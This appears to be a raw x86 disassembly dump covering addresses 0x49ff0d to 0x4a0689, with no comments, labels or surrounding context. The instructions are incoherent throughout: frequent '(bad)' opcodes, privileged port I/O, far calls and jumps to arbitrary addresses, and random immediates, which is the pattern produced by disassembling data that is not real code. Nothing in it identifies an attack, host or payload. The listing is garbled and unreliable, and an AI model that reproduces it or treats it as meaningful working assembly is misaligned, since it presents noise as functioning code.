  49ff0d:	add    eax,0x431b83ca
  49ff12:	push   es
  49ff13:	in     al,0x87
  49ff15:	push   cs
  49ff16:	outs   dx,DWORD PTR ds:[esi]
  49ff17:	inc    ebp
  49ff18:	pusha  
  49ff19:	or     BYTE PTR [ebx-0x5f],al
  49ff1c:	imul   ebx,esi,0x4b
  49ff1f:	add    esp,DWORD PTR [esi+0x75]
  49ff22:	and    ecx,DWORD PTR [eax+edi*8]
  49ff25:	sbb    al,0x43
  49ff27:	fs sub DWORD PTR fs:[ebp-0x6b],0x816c97fd
  49ff30:	xchg   edi,eax
  49ff31:	jo     0x49ffac
  49ff33:	pop    esi
  49ff34:	dec    esp
  49ff35:	sub    eax,DWORD PTR [esi-0x6b]
  49ff38:	ror    DWORD PTR [eax-0x1f],cl
  49ff3b:	add    eax,0x3aa424c0
  49ff40:	aam    0xa8
  49ff42:	sbb    al,cl
  49ff44:	inc    esp
  49ff45:	call   0x235f:0x3a8e7b84
  49ff4c:	sbb    dh,BYTE PTR [esi-0x1bb0bc9b]
  49ff52:	in     eax,dx
  49ff53:	sbb    bl,BYTE PTR [ecx-0x27dfc362]
  49ff59:	pop    es
  49ff5a:	or     ecx,ebp
  49ff5c:	pop    ds
  49ff5d:	(bad)  
  49ff5e:	fimul  WORD PTR [esi+0x3b]
  49ff61:	cmp    al,0x5e
  49ff63:	ret    
  49ff64:	aam    0x29
  49ff66:	mov    dl,0x16
  49ff68:	jmp    0x58a3413b
  49ff6d:	clc    
  49ff6e:	add    DWORD PTR [edi+0x18],ecx
  49ff71:	push   cs
  49ff72:	pop    es
  49ff73:	scas   al,BYTE PTR es:[edi]
  49ff74:	out    0xdd,al
  49ff76:	call   0x2740:0x18888f50
  49ff7d:	mov    eax,ds:0x852b0b08
  49ff82:	mov    ds:0x1a2b566d,eax
  49ff87:	inc    edx
  49ff88:	sub    bp,cx
  49ff8b:	sbb    al,0x4b
  49ff8d:	cmp    al,0x4d
  49ff8f:	or     esp,DWORD PTR [ecx-0x1f]
  49ff92:	dec    esi
  49ff93:	in     eax,0x28
  49ff95:	sbb    ah,BYTE PTR [edx+0x40]
  49ff98:	or     BYTE PTR [ebx],cl
  49ff9a:	jmp    0x6231dea8
  49ff9f:	ja     0x4a001e
  49ffa1:	arpl   WORD PTR ds:0x2b3ed57,dx
  49ffa7:	xor    eax,DWORD PTR [ecx]
  49ffa9:	sbb    BYTE PTR [esi+0x7bf09384],ch
  49ffaf:	inc    ecx
  49ffb0:	and    ecx,DWORD PTR [eax]
  49ffb2:	js     0x49ff7c
  49ffb4:	xor    ah,BYTE PTR [ecx+edi*4]
  49ffb7:	pop    ebx
  49ffb8:	ret    0x84ce
  49ffbb:	lds    ebp,FWORD PTR [ebx+edx*1-0xd]
  49ffbf:	adc    BYTE PTR [eax+edx*1+0x2f],bh
  49ffc3:	test   DWORD PTR [esi],edx
  49ffc5:	sbb    eax,0xe42f5938
  49ffca:	rol    BYTE PTR [edx+0x7d],0xd6
  49ffce:	add    al,BYTE PTR [eax]
  49ffd0:	dec    esi
  49ffd1:	and    dl,ch
  49ffd3:	push   ebx
  49ffd4:	adc    BYTE PTR [edi+0x26],bh
  49ffd7:	lsl    ebx,WORD PTR [esi]
  49ffda:	test   BYTE PTR [eax],ch
  49ffdc:	es js  0x49ffc6
  49ffdf:	adc    al,0xf4
  49ffe1:	push   esi
  49ffe2:	sub    BYTE PTR [edx+0x18],dl
  49ffe5:	sub    al,0x27
  49ffe7:	sahf   
  49ffe8:	(bad)  
  49ffe9:	neg    BYTE PTR [ebp+0x680eebba]
  49ffef:	inc    esp
  49fff0:	jl     0x49ffb9
  49fff2:	or     ecx,ebp
  49fff4:	mov    al,BYTE PTR [eax-0x7b]
  49fff7:	int    0x1b
  49fff9:	push   edi
  49fffa:	sub    esp,ebx
  49fffc:	push   edi
  49fffd:	stos   DWORD PTR es:[edi],eax
  49fffe:	nop
  49ffff:	add    edx,ebx
  4a0001:	inc    ecx
  4a0002:	pop    eax
  4a0003:	push   ecx
  4a0004:	jae    0x4a0061
  4a0006:	jo     0x49ffc4
  4a0008:	mov    eax,ds:0x953a302d
  4a000d:	push   ecx
  4a000e:	xchg   DWORD PTR [eax-0x2a],edx
  4a0011:	shl    esi,1
  4a0013:	out    dx,al
  4a0014:	sbb    cl,BYTE PTR [eax+0x104f616c]
  4a001a:	aad    0x14
  4a001c:	push   edi
  4a001d:	cmp    BYTE PTR [edx],ah
  4a001f:	dec    esp
  4a0020:	jg     0x4a0018
  4a0022:	inc    esi
  4a0023:	push   esi
  4a0024:	int    0x56
  4a0026:	xor    BYTE PTR ds:0xa5f77461,al
  4a002c:	sub    al,0xa0
  4a002e:	mov    bl,0x84
  4a0030:	jb     0x857f7877
  4a0036:	push   edi
  4a0037:	mov    ch,0x54
  4a0039:	push   edx
  4a003a:	jle    0x4a0038
  4a003c:	jle    0x4a00ae
  4a003e:	mov    al,ds:0x5076128c
  4a0043:	push   0xd6447c80
  4a0048:	popa   
  4a0049:	xor    edx,DWORD PTR [ebp+0x52]
  4a004c:	jmp    0x29a:0xc0d2160b
  4a0053:	lahf   
  4a0054:	sbb    al,al
  4a0056:	inc    esp
  4a0057:	or     BYTE PTR ds:0xae436800,cl
  4a005d:	loopne 0x4a00d4
  4a005f:	invd   
  4a0061:	das    
  4a0062:	push   ds
  4a0063:	xchg   esp,eax
  4a0064:	arpl   bp,ax
  4a0066:	fwait
  4a0067:	sbb    esi,ebx
  4a0069:	adc    cl,al
  4a006b:	psraw  mm5,QWORD PTR [ecx+ebp*2+0xa88be02]
  4a0073:	and    eax,0x5704aa51
  4a0078:	push   ebx
  4a0079:	jmp    0x4a0088
  4a007b:	cmp    BYTE PTR [ecx+0x6a],cl
  4a007e:	adc    bh,BYTE PTR [esi-0x5]
  4a0081:	cmp    BYTE PTR [esi+ecx*1],cl
  4a0084:	shr    DWORD PTR [esi],0x9a
  4a0087:	jmp    0x4a008c
  4a0089:	push   edi
  4a008a:	or     dl,BYTE PTR [ecx+0x46c7c086]
  4a0090:	pop    ebx
  4a0091:	lods   eax,DWORD PTR ds:[esi]
  4a0092:	inc    ax
  4a0094:	dec    DWORD PTR [eax]
  4a0096:	push   es
  4a0097:	or     al,0x15
  4a0099:	push   esi
  4a009a:	mov    si,WORD PTR [ecx+eax*2]
  4a009e:	sub    DWORD PTR [edx],0xfeeca10c
  4a00a4:	sub    al,BYTE PTR [edx-0x6]
  4a00a7:	push   es
  4a00a8:	push   eax
  4a00a9:	add    eax,0x5eb04154
  4a00ae:	pop    esp
  4a00af:	addr16 popa 
  4a00b1:	and    al,BYTE PTR [esi-0x3e]
  4a00b4:	dec    edi
  4a00b5:	pop    eax
  4a00b6:	push   ebp
  4a00b7:	sbb    esi,DWORD PTR [edi-0x63]
  4a00ba:	inc    eax
  4a00bb:	shl    BYTE PTR cs:[ecx],1
  4a00be:	dec    edi
  4a00bf:	push   ss
  4a00c0:	mov    esi,0x60692d0d
  4a00c5:	and    esp,DWORD PTR [ebp+0x74614234]
  4a00cb:	and    al,0x74
  4a00cd:	mov    edi,0xeb1c42ac
  4a00d2:	add    eax,0x27404021
  4a00d7:	or     al,0x85
  4a00d9:	adc    eax,0xc5422d5e
  4a00de:	inc    edx
  4a00df:	mov    bh,0x1
  4a00e1:	xchg   DWORD PTR [ebp-0x4f35f9fe],eax
  4a00e7:	bound  esp,QWORD PTR fs:[edi-0x77]
  4a00eb:	or     eax,0xe1ea5d74
  4a00f0:	das    
  4a00f1:	dec    esp
  4a00f2:	mov    edx,0x85b100ea
  4a00f7:	add    BYTE PTR [ebp-0x39a3f761],cl
  4a00fd:	push   esi
  4a00fe:	inc    ecx
  4a00ff:	adc    eax,0xed1c5548
  4a0104:	push   ds
  4a0105:	hlt    
  4a0106:	lea    esp,ds:0x513ce068
  4a010c:	jno    0x4a0090
  4a010e:	test   DWORD PTR ds:0x38780ed0,ebx
  4a0114:	jne    0x4a0157
  4a0116:	ins    BYTE PTR es:[edi],dx
  4a0117:	imul   ebp,DWORD PTR [ebp-0xfec7d21],0x0
  4a011e:	imul   esp,DWORD PTR ds:0x29377e5d,0x58164608
  4a0128:	or     al,BYTE PTR [edi]
  4a012a:	adc    ebx,DWORD PTR [ebx-0x1807f608]
  4a0130:	inc    esi
  4a0131:	hlt    
  4a0132:	ja     0x4a00d1
  4a0134:	jno    0x4a00f0
  4a0136:	outs   dx,DWORD PTR ds:[esi]
  4a0137:	lods   al,BYTE PTR ds:[esi]
  4a0138:	add    al,0x77
  4a013a:	jne    0x4a0121
  4a013c:	push   edi
  4a013d:	das    
  4a013e:	xchg   edi,eax
  4a013f:	push   eax
  4a0140:	arpl   dx,si
  4a0142:	sub    DWORD PTR [ebx-0x71],0xf2a2c32
  4a0149:	icebp  
  4a014a:	les    edi,FWORD PTR [eax+edx*2-0x20]
  4a014e:	aam    0xef
  4a0150:	push   eax
  4a0151:	xchg   esp,eax
  4a0152:	dec    eax
  4a0153:	jb     0x75dad094
  4a0159:	mov    ebx,0x5310799d
  4a015e:	fmul   QWORD PTR [esi-0x3f]
  4a0161:	out    dx,eax
  4a0162:	add    al,dl
  4a0164:	cmp    BYTE PTR [ebp-0x9],bh
  4a0167:	lea    eax,[ebx]
  4a0169:	sub    eax,0xdb33a05b
  4a016e:	sbb    dl,BYTE PTR [ecx-0x3e]
  4a0171:	pop    ss
  4a0172:	(bad)  
  4a0173:	mul    BYTE PTR [eax-0x1ff614aa]
  4a0179:	adc    al,0x80
  4a017b:	push   ecx
  4a017c:	cmp    edi,DWORD PTR [edx-0x24]
  4a017f:	or     DWORD PTR [ecx],ebp
  4a0181:	ror    BYTE PTR [edx],0xff
  4a0184:	xchg   esp,eax
  4a0185:	popf   
  4a0186:	lods   eax,DWORD PTR ds:[esi]
  4a0187:	sub    bl,BYTE PTR [esi]
  4a0189:	es daa 
  4a018b:	sub    BYTE PTR [eax+0x7c9cdc80],dh
  4a0191:	rol    DWORD PTR [edx+0x159eb5b],1
  4a0197:	sbb    al,0x48
  4a0199:	imul   esp,esi,0xffffffdb
  4a019c:	retf   0x9e87
  4a019f:	test   eax,0x7a50dcb5
  4a01a4:	and    al,0x46
  4a01a6:	js     0x4a0201
  4a01a8:	cmp    BYTE PTR [edx-0x34],0xd8
  4a01ac:	stc    
  4a01ad:	call   0xbdfa17af
  4a01b2:	or     al,0x9c
  4a01b4:	aam    0xe4
  4a01b6:	push   edi
  4a01b7:	es pop ss
  4a01b9:	jo     0x4a01da
  4a01bb:	jge    0x4a0142
  4a01bd:	dec    ecx
  4a01be:	sub    bh,ch
  4a01c0:	lahf   
  4a01c1:	xchg   esi,eax
  4a01c2:	push   cs
  4a01c3:	sub    al,0x4e
  4a01c5:	cs call 0xa96d268c
  4a01cb:	add    eax,0xc023a90e
  4a01d0:	or     eax,0x14aa5881
  4a01d5:	pop    esi
  4a01d6:	test   BYTE PTR ds:0xb2a1de90,bl
  4a01dc:	test   BYTE PTR [ecx],ch
  4a01de:	loop   0x4a01eb
  4a01e0:	xchg   edx,eax
  4a01e1:	sbb    BYTE PTR [eax+0x5a],bl
  4a01e4:	out    dx,eax
  4a01e5:	test   BYTE PTR [ecx+0x61],ah
  4a01e8:	in     al,dx
  4a01e9:	adc    ah,ah
  4a01eb:	aad    0x8d
  4a01ed:	add    eax,0xe430350e
  4a01f2:	fldcw  WORD PTR [edi+0x7329be8e]
  4a01f8:	inc    eax
  4a01f9:	loope  0x4a0197
  4a01fb:	add    ch,BYTE PTR [esi]
  4a01fd:	loope  0x4a0219
  4a01ff:	add    dh,BYTE PTR [edi+0x34abd072]
  4a0205:	add    BYTE PTR [eax-0x3c],dh
  4a0208:	lea    esp,[ebx]
  4a020a:	xchg   BYTE PTR [edi],cl
  4a020c:	test   DWORD PTR [edi-0x3c],ebx
  4a020f:	enter  0xb121,0xc6
  4a0213:	push   es
  4a0214:	jns    0x4a0257
  4a0216:	add    BYTE PTR [edi],dl
  4a0218:	xor    eax,0xd06ebab6
  4a021d:	sbb    DWORD PTR [esi-0x15b632bc],edx
  4a0223:	push   ebp
  4a0224:	shl    DWORD PTR [ecx],0x70
  4a0227:	sahf   
  4a0228:	push   edx
  4a0229:	int3   
  4a022a:	dec    eax
  4a022b:	jnp    0x4a01cd
  4a022d:	bsf    eax,eax
  4a0230:	dec    eax
  4a0231:	(bad)  
  4a0232:	enter  0xc0c7,0x5d
  4a0236:	xchg   esp,eax
  4a0237:	ja     0x4a0219
  4a0239:	fdivp  st(0),st
  4a023b:	and    dh,al
  4a023d:	push   esi
  4a023e:	imul   eax,esp,0x3b8081f9
  4a0244:	call   0xcf355292
  4a0249:	mov    cl,0x6
  4a024b:	or     al,0xaf
  4a024d:	pusha  
  4a024e:	jmp    0x4a025d
  4a0250:	mov    ebp,DWORD PTR [ebx+ebp*4+0x2]
  4a0254:	sahf   
  4a0255:	push   ecx
  4a0256:	aaa    
  4a0257:	add    ebx,ebp
  4a0259:	adc    ebp,DWORD PTR [esi-0x7c7ddeee]
  4a025f:	sub    ax,WORD PTR [eax+0x6334e108]
  4a0266:	adc    ebx,DWORD PTR ds:0x72f701a9
  4a026c:	xor    al,0x35
  4a026e:	mov    al,0x60
  4a0270:	dec    ebp
  4a0271:	ret    
  4a0272:	fisttp DWORD PTR ds:0x233a2d30
  4a0278:	out    dx,eax
  4a0279:	adc    BYTE PTR [ebp+0x26],ah
  4a027c:	daa    
  4a027d:	xchg   DWORD PTR [ebx],ebx
  4a027f:	aaa    
  4a0280:	sbb    DWORD PTR [eax-0xc],ebp
  4a0283:	add    DWORD PTR [edi+0x16755610],ecx
  4a0289:	iret   
  4a028a:	(bad)  
  4a028c:	lea    ebp,cs:[ebx]
  4a028f:	sbb    al,0x27
  4a0291:	cld    
  4a0292:	sti    
  4a0293:	push   ebx
  4a0294:	js     0x4a02cb
  4a0296:	in     al,0xff
  4a0298:	nop    DWORD PTR [edi+0x4761c0]
  4a029f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a02a0:	sub    DWORD PTR [ebx-0x7f],eax
  4a02a3:	rcr    BYTE PTR [eax+0x4ceb616e],1
  4a02a9:	xor    bh,BYTE PTR [ecx+eiz*2]
  4a02ac:	mov    al,0x60
  4a02ae:	and    DWORD PTR [eax-0x4],esp
  4a02b1:	pop    ebp
  4a02b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a02b3:	xchg   DWORD PTR [ebp+0x3a3d63c6],ecx
  4a02b9:	inc    edx
  4a02ba:	sbb    BYTE PTR [edx],0x4f
  4a02bd:	push   ss
  4a02be:	xor    ebp,DWORD PTR [eax+edi*4]
  4a02c1:	fimul  WORD PTR ds:0x988981d4
  4a02c7:	cmp    ch,BYTE PTR [esi]
  4a02c9:	or     dl,0xcf
  4a02cc:	sbb    DWORD PTR [ebx],edi
  4a02ce:	sbb    esi,DWORD PTR [eax+0x64]
  4a02d1:	xor    DWORD PTR [edx+eiz*1+0x2f],esi
  4a02d5:	or     DWORD PTR [ebp+0x69],ebx
  4a02d8:	xor    BYTE PTR [ebx],dl
  4a02da:	test   BYTE PTR [eax-0x4],dh
  4a02dd:	push   0x3b875724
  4a02e2:	mov    ds:0xba7b1c83,eax
  4a02e7:	jae    0x4a02f9
  4a02e9:	adc    BYTE PTR [ecx],al
  4a02eb:	cld    
  4a02ec:	push   ecx
  4a02ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a02ee:	loopne 0x4a0284
  4a02f0:	cld    
  4a02f1:	inc    esi
  4a02f2:	add    BYTE PTR [esi+eiz*2+0x2ba43008],0x98
  4a02fa:	dec    edi
  4a02fb:	pop    ecx
  4a02fc:	sbb    BYTE PTR [esi+eax*8],cl
  4a02ff:	in     eax,dx
  4a0300:	sub    DWORD PTR [edx+eax*1],esp
  4a0303:	mov    dl,0x56
  4a0305:	retf   0x2d1c
  4a0308:	or     ch,BYTE PTR [edx+0x2c41fb54]
  4a030e:	dec    eax
  4a030f:	je     0x4a033b
  4a0311:	add    al,0x1e
  4a0313:	outs   dx,BYTE PTR ds:[esi]
  4a0314:	je     0x4a02d3
  4a0316:	push   ss
  4a0317:	aam    0x12
  4a0319:	mov    ecx,0x80793026
  4a031e:	mov    bh,0x8d
  4a0320:	or     eax,0x40fdc763
  4a0325:	add    BYTE PTR [ecx],dl
  4a0327:	and    BYTE PTR [ecx+edx*4+0x67b726d8],dl
  4a032e:	dec    edx
  4a032f:	or     eax,0xb259059c
  4a0334:	std    
  4a0335:	leave  
  4a0336:	ret    0x24a7
  4a0339:	pop    edx
  4a033a:	jo     0x4a03b0
  4a033c:	dec    edx
  4a033d:	dec    ecx
  4a033e:	dec    eax
  4a033f:	sbb    al,0xd4
  4a0341:	mov    eax,esp
  4a0343:	cwde   
  4a0344:	adc    BYTE PTR [eax],cl
  4a0346:	jmp    0x4a02dc
  4a0348:	or     BYTE PTR [ebx],dl
  4a034a:	add    al,0x19
  4a034c:	pop    edx
  4a034d:	jp     0x4a0363
  4a034f:	mov    ah,0x19
  4a0351:	push   esp
  4a0352:	(bad)  
  4a0353:	iret   
  4a0354:	(bad)  
  4a0355:	aaa    
  4a0356:	retf   0x8ad5
  4a0359:	adc    DWORD PTR [ebx-0x15f62b76],ecx
  4a035f:	jmp    FWORD PTR [ecx]
  4a0361:	pop    eax
  4a0362:	sbb    BYTE PTR [esi-0x57],dl
  4a0365:	fld    QWORD PTR [edi+ebx*2+0x3d765a4a]
  4a036c:	pop    es
  4a036d:	cwde   
  4a036e:	out    dx,eax
  4a036f:	cmp    DWORD PTR [edx+eax*4-0x5e7e1dd6],0x5b
  4a0377:	mov    ebp,0x4724890c
  4a037c:	pusha  
  4a037d:	xor    eax,0x84aca3e0
  4a0382:	test   DWORD PTR [edi+0x20240d9c],esp
  4a0388:	cmc    
  4a0389:	add    BYTE PTR [ecx+0x7c],al
  4a038c:	and    DWORD PTR ds:0x101bb35c,eax
  4a0392:	imul   ebp,DWORD PTR [ebp-0x770af7fe],0x61cd207
  4a039c:	or     BYTE PTR [edx+edi*8-0x5b],al
  4a03a0:	mov    ch,0x68
  4a03a2:	js     0x4a0405
  4a03a4:	and    ebp,DWORD PTR [esi-0x79]
  4a03a7:	add    ecx,DWORD PTR [edx]
  4a03a9:	mov    esp,DWORD PTR [ecx+0x4edab080]
  4a03af:	dec    eax
  4a03b0:	xor    esp,DWORD PTR [esi]
  4a03b2:	retf   
  4a03b3:	dec    eax
  4a03b4:	nop
  4a03b5:	jne    0x4a03c9
  4a03b7:	sub    eax,0x9584b0d6
  4a03bc:	cld    
  4a03bd:	or     BYTE PTR [ecx],bh
  4a03bf:	xchg   edx,eax
  4a03c0:	and    edi,DWORD PTR [ecx-0x4ffe5bb9]
  4a03c6:	push   0x14
  4a03c8:	xchg   edx,eax
  4a03c9:	and    eax,DWORD PTR [ebx]
  4a03cb:	enter  0x1eb,0xf1
  4a03cf:	and    al,0x5d
  4a03d1:	and    ecx,DWORD PTR [eax+edi*4-0x1a15a3eb]
  4a03d8:	xor    ch,BYTE PTR [ebx]
  4a03da:	pushf  
  4a03db:	add    DWORD PTR [ebp+0x7107b484],ecx
  4a03e1:	sub    BYTE PTR [edi+0x5b],ah
  4a03e4:	dec    DWORD PTR [esi]
  4a03e6:	xchg   ebp,eax
  4a03e7:	std    
  4a03e8:	ror    BYTE PTR [eax+eiz*1],0x8d
  4a03ec:	dec    edx
  4a03ed:	add    al,0x90
  4a03ef:	cmp    DWORD PTR [ecx],esi
  4a03f1:	mov    ebp,0xfd448c86
  4a03f6:	outs   dx,BYTE PTR ds:[esi]
  4a03f7:	jl     0x4a03ec
  4a03f9:	es jge 0x4a03fe
  4a03fc:	lock or BYTE PTR [ebp+edx*1+0x5a],dh
  4a0401:	adc    al,0xc2
  4a0403:	mov    al,0x76
  4a0405:	cmp    bh,BYTE PTR [esi+0x18]
  4a0408:	rcl    BYTE PTR [esi+0x52],1
  4a040b:	sub    BYTE PTR [eax+0x4ab97277],0x26
  4a0412:	adc    BYTE PTR [esp+eiz*4],cl
  4a0415:	xor    al,0x85
  4a0417:	adc    al,0x58
  4a0419:	jmp    0x4a041b
  4a041b:	add    bh,BYTE PTR [esi+0x89e6a61]
  4a0421:	adc    al,0x4d
  4a0423:	jae    0x4a0408
  4a0425:	or     al,0xf
  4a0427:	dec    edx
  4a0428:	jl     0x4a0428
  4a042a:	lock sub DWORD PTR [ebp*4+0x548bf086],esi
  4a0432:	test   DWORD PTR [esi],0x804053f7
  4a0438:	add    eax,0x5cf60684
  4a043d:	sbb    al,ah
  4a043f:	mov    esi,esi
  4a0441:	jle    0x4a045c
  4a0443:	or     BYTE PTR [ecx-0x3c509ca5],al
  4a0449:	lods   al,BYTE PTR ds:[esi]
  4a044a:	ins    DWORD PTR es:[edi],dx
  4a044b:	mov    WORD PTR [ebx-0x55],cs
  4a044e:	repnz sub eax,0x871a362
  4a0454:	mul    DWORD PTR [ecx+0x370c267a]
  4a045a:	ds push ecx
  4a045c:	mov    bl,0xd0
  4a045e:	sbb    dh,BYTE PTR [edx-0x7f]
  4a0461:	or     BYTE PTR [esi+0x642c2338],ch
  4a0467:	adc    eax,0x57db0494
  4a046c:	or     al,0x29
  4a046e:	or     DWORD PTR [ecx-0x511f1ff6],eax
  4a0474:	push   edi
  4a0475:	jo     0x4a04c1
  4a0477:	inc    esp
  4a0478:	or     bl,BYTE PTR [edi+0x7f]
  4a047b:	xchg   ebx,eax
  4a047c:	push   edi
  4a047d:	xchg   BYTE PTR [edi+esi*8+0x28],bl
  4a0481:	jge    0x4a0469
  4a0483:	push   ss
  4a0484:	ret    0xac46
  4a0487:	int    0x0
  4a0489:	or     eax,0x5896855f
  4a048e:	test   al,0x0
  4a0490:	jne    0x4a04ac
  4a0492:	push   cs
  4a0493:	test   BYTE PTR [esi],dl
  4a0495:	leave  
  4a0496:	jmp    0xa85c:0x25365d3b
  4a049d:	and    eax,0xcba93105
  4a04a2:	dec    edx
  4a04a3:	mov    esp,0x1b575709
  4a04a8:	mov    ch,0xb9
  4a04aa:	mov    esp,0x25a47292
  4a04af:	in     al,0x53
  4a04b1:	push   eax
  4a04b2:	jmp    0x4a0501
  4a04b4:	retf   
  4a04b5:	loopne 0x4a0529
  4a04b7:	xor    eax,0xf0318244
  4a04bc:	popa   
  4a04bd:	mov    ebx,0x6b858a27
  4a04c2:	inc    esi
  4a04c3:	pop    ds
  4a04c4:	xor    ch,BYTE PTR [eax+esi*2]
  4a04c7:	mov    WORD PTR [ebx+0xb],ss
  4a04ca:	int    0x32
  4a04cc:	mov    cl,0x10
  4a04ce:	sbb    al,0x36
  4a04d0:	push   ebx
  4a04d1:	or     eax,0x5f6566ce
  4a04d6:	adc    BYTE PTR [ecx+0x57],dl
  4a04d9:	cwde   
  4a04da:	out    dx,al
  4a04db:	sbb    dh,BYTE PTR [edx+0x70759987]
  4a04e1:	push   eax
  4a04e2:	add    BYTE PTR [eax+ebx*2],ah
  4a04e5:	pusha  
  4a04e6:	jnp    0x4a0518
  4a04e8:	test   ebx,edi
  4a04ea:	adc    DWORD PTR [esi+eiz*4],edx
  4a04ed:	xchg   ebp,eax
  4a04ee:	sub    eax,0x56f602c6
  4a04f3:	add    ebx,DWORD PTR [ebx-0x24]
  4a04f6:	test   BYTE PTR [edx],ch
  4a04f8:	jnp    0x4a04f7
  4a04fa:	int    0x96
  4a04fc:	xor    eax,0x849670b0
  4a0501:	xlat   BYTE PTR ds:[ebx]
  4a0502:	and    eax,0x317072ef
  4a0507:	sbb    dh,dl
  4a0509:	push   ebx
  4a050a:	cmp    BYTE PTR [eax],al
  4a050c:	push   ebp
  4a050d:	sbb    al,0x52
  4a050f:	nop
  4a0510:	popa   
  4a0511:	popa   
  4a0512:	push   es
  4a0513:	cmp    DWORD PTR [eax+ebx*2],edi
  4a0516:	aas    
  4a0517:	sub    ch,BYTE PTR [ebp+0x258d24a]
  4a051d:	fbld   TBYTE PTR [esi+0x55085b43]
  4a0523:	in     al,0x50
  4a0525:	das    
  4a0526:	sub    al,0x9c
  4a0528:	mov    ch,0x46
  4a052a:	sub    eax,0xbcbf8b07
  4a052f:	imul   ebx,ebp,0x26
  4a0532:	iret   
  4a0533:	xchg   BYTE PTR [edi],cl
  4a0535:	ja     0x4a058e
  4a0537:	rol    BYTE PTR [esi+eax*4-0xf986c6a],0x56
  4a053f:	sbb    DWORD PTR [edi-0x9c4df0c],ebx
  4a0545:	fstp   QWORD PTR [ebp-0x28]
  4a0548:	test   BYTE PTR [esi+0x8],dl
  4a054b:	cmp    edi,esp
  4a054d:	ja     0x4a05b3
  4a054f:	test   eax,0x39f42c41
  4a0554:	sub    esp,DWORD PTR [edx-0x74]
  4a0557:	sbb    eax,DWORD PTR [edi-0x51f2ae5a]
  4a055d:	push   ebp
  4a055e:	mov    al,ds:0x22129ddf
  4a0563:	fisubr DWORD PTR [ebp-0x18]
  4a0566:	push   edx
  4a0567:	loopne 0x4a054e
  4a0569:	loopne 0x4a0547
  4a056b:	or     BYTE PTR [esi],bl
  4a056d:	inc    edx
  4a056e:	sub    BYTE PTR [eax-0x4d],0xc8
  4a0572:	imul   edx,DWORD PTR [edx+0x13],0xffffffab
  4a0576:	push   esi
  4a0577:	mov    ch,0xeb
  4a0579:	add    al,0xe5
  4a057b:	or     dl,BYTE PTR [edx]
  4a057d:	pushf  
  4a057e:	or     al,0xe1
  4a0580:	add    DWORD PTR [eax+0x1c],ecx
  4a0583:	jp     0x4a05eb
  4a0585:	test   cl,bl
  4a0587:	pop    edi
  4a0588:	icebp  
  4a0589:	retf   0x9278
  4a058c:	out    dx,al
  4a058d:	pop    ebp
  4a058e:	cld    
  4a058f:	jnp    0x4a0581
  4a0591:	cmp    BYTE PTR [ebp+0x2c],bl
  4a0594:	pusha  
  4a0595:	or     dl,BYTE PTR [eax-0x2f]
  4a0598:	push   ebx
  4a0599:	call   0xe822ebc9
  4a059e:	neg    DWORD PTR ds:0xc0a35699
  4a05a4:	add    BYTE PTR [eax],bl
  4a05a6:	and    BYTE PTR [edi+0x8],0xd3
  4a05aa:	xor    ch,ch
  4a05ac:	inc    esi
  4a05ad:	ds shr ah,1
  4a05b0:	xor    al,dh
  4a05b2:	push   edi
  4a05b3:	or     eax,0xeebca333
  4a05b8:	jne    0x4a054d
  4a05ba:	(bad)  
  4a05bb:	or     dh,dl
  4a05bd:	push   cs
  4a05be:	push   esi
  4a05bf:	push   ecx
  4a05c0:	dec    ebp
  4a05c1:	dec    ebx
  4a05c2:	sub    ebp,0xffffffdd
  4a05c5:	or     al,0xa1
  4a05c7:	and    dh,BYTE PTR [ebx+0x1a]
  4a05ca:	jmp    0x4a05cf
  4a05cc:	xchg   BYTE PTR [ebx-0x26dcabe2],cl
  4a05d2:	popa   
  4a05d3:	(bad)  
  4a05d4:	pop    ebx
  4a05d5:	neg    ch
  4a05d7:	popf   
  4a05d8:	xor    ah,bl
  4a05da:	push   edi
  4a05db:	mov    eax,ds:0x3b4e686d
  4a05e0:	add    eax,0x2c497553
  4a05e5:	lock xchg DWORD PTR [esi-0x44],eax
  4a05e9:	pop    esi
  4a05ea:	pop    edi
  4a05eb:	mov    DWORD PTR [edx+0x4a],0x5820c0db
  4a05f2:	adc    ebp,DWORD PTR [eax+0x6e]
  4a05f5:	add    DWORD PTR [esi+ebx*1-0x65],esi
  4a05f9:	popf   
  4a05fa:	jl     0x4a0583
  4a05fc:	(bad)  
  4a05fd:	out    dx,al
  4a05fe:	sub    bh,bl
  4a0600:	mov    eax,ds:0xda761205
  4a0605:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a0606:	es push ecx
  4a0608:	cmp    al,0x51
  4a060a:	test   BYTE PTR [ebx-0x57],al
  4a060d:	mov    DWORD PTR [ebp-0x75],edx
  4a0610:	por    mm3,QWORD PTR [ebp-0x4e]
  4a0614:	push   edx
  4a0615:	cmp    eax,0x745e04ec
  4a061a:	xor    al,0x54
  4a061c:	rol    BYTE PTR [edi-0x6399bbd6],1
  4a0622:	push   0x1c
  4a0624:	pusha  
  4a0625:	xchg   esp,eax
  4a0626:	jmp    0xac90b88b
  4a062b:	out    dx,al
  4a062c:	dec    ebp
  4a062d:	in     al,0x80
  4a062f:	sbb    al,0x5c
  4a0631:	mov    bh,0x1d
  4a0633:	cmp    eax,0x53c89c29
  4a0638:	hlt    
  4a0639:	cmp    BYTE PTR [eax+0x3a88b163],0x1f
  4a0640:	out    dx,al
  4a0641:	jmp    0x4a066b
  4a0643:	mov    DWORD PTR [edi+0x206521b7],esi
  4a0649:	or     ebp,DWORD PTR [esi]
  4a064b:	and    BYTE PTR [esi+eiz*2],dh
  4a064e:	add    bh,bh
  4a0650:	and    BYTE PTR [ebp+0xa],bh
  4a0653:	sbb    ebp,ebx
  4a0655:	lock inc eax
  4a0657:	dec    edx
  4a0658:	xor    eax,0x1351fb7e
  4a065d:	pop    ecx
  4a065e:	xchg   edi,eax
  4a065f:	mov    cl,0x62
  4a0661:	push   edi
  4a0662:	or     DWORD PTR [edi+0x47],edx
  4a0665:	sbb    BYTE PTR [edx+0x40],ah
  4a0668:	pusha  
  4a0669:	stos   BYTE PTR es:[edi],al
  4a066a:	scas   al,BYTE PTR es:[edi]
  4a066b:	sbb    ebx,DWORD PTR [ebx+0x240a3f89]
  4a0671:	add    DWORD PTR [eax+0x74fc0f45],ecx
  4a0677:	xor    eax,0x328e85f7
  4a067c:	pop    ebx
  4a067d:	fisttp QWORD PTR [ebx+eax*1-0x3ef4e6c9]
  4a0684:	push   ds
  4a0685:	mov    al,0xd3
  4a0687:	js     0x4a0699
  4a0689:	xor    DWORD PTR [ebp+0x4055728a],esp
